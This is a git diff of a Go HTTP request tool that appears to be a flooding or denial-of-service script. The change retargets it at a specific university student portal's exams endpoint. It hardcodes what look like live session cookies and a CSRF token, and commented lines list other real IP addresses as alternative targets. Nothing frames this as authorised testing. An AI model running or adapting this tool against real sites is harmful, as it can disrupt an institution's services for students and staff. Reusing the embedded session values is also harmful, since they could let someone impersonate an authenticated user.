@@ -94,7 +94,7 @@ func main() {
 	// flag.StringVar(&site, "site", "https://213.230.124.250:8089/driver_candidate_api/v1/settings", "Destination site.")
 
 	//hemis adu
-	flag.StringVar(&site, "site", "https://student.adu.uz", "Destination site.")
+	flag.StringVar(&site, "site", "https://student.adu.uz/test/exams?semester=14&_pjax=%23test-grid&_pjax=%23test-grid", "Destination site.")
 
 	// biznes
 	// flag.StringVar(&site, "site", "https://62.209.144.97:8090/driver_candidate_api/v1/settings", "Destination site.")
@@ -242,7 +242,8 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
 		q.Header.Set("Connection", "keep-alive")
 		q.Header.Set("Host", host)
-		q.Header.Set("Cookie", "_ga=GA1.1.1371172649.1645511335; week=0fc595e1389827a925f24d27ecd1781212dbe7705be86e7df85363953a21a009a%3A2%3A%7Bi%3A0%3Bs%3A4%3A%22week%22%3Bi%3A1%3Bs%3A5%3A%2276256%22%3B%7D; _ga_31T1HFVMCX=GS1.1.1646916759.5.0.1646916759.0; frontend=8f2hoj60a8ertjkan990bsr9t7; _frontendUser=28265cc7bdc04fe769905cdb11d5835f2350047cef4702fb31cb443894ecbac4a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_frontendUser%22%3Bi%3A1%3Bs%3A48%3A%22%5B%223744%22%2C%22vn-iY_LVeK0nilycrHARhSchEqKp1irL%22%2C3600%5D%22%3B%7D; _csrf-frontend=d6e8c88628501588a91da321177253a1a1cb149816d9dc4f91194688c69b3743a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22kYuxM87QFfBN_GClLcuZRsPM35Xse1yw%22%3B%7D")
+		q.Header.Set("X-CSRF-Token", "fju31d-3p4iD_FAOk9ecY6K9SqaKX3wREdF5r2LBCLgMY_-Btf2f2vfIYGLZjakJ6c8unroTO35flBXtOuxL9A==")
+		q.Header.Set("Cookie", "_ga=GA1.1.1371172649.1645511335; week=0fc595e1389827a925f24d27ecd1781212dbe7705be86e7df85363953a21a009a%3A2%3A%7Bi%3A0%3Bs%3A4%3A%22week%22%3Bi%3A1%3Bs%3A5%3A%2276256%22%3B%7D; _ga_31T1HFVMCX=GS1.1.1646916759.5.0.1646916759.0; frontend=90gb0pci9m6k9n5bgndraifdfv; _frontendUser=28265cc7bdc04fe769905cdb11d5835f2350047cef4702fb31cb443894ecbac4a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_frontendUser%22%3Bi%3A1%3Bs%3A48%3A%22%5B%223744%22%2C%22vn-iY_LVeK0nilycrHARhSchEqKp1irL%22%2C3600%5D%22%3B%7D; _csrf-frontend=9a0c5f2c95adb72ef35cd0895a012bc869442e337b1c3787e544f8c986accaa3a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22rXHTjJ8Rt40lJZ5jKrd80LGoNElBX-CL%22%3B%7D")
 
 		// Overwrite headers with parameters
 
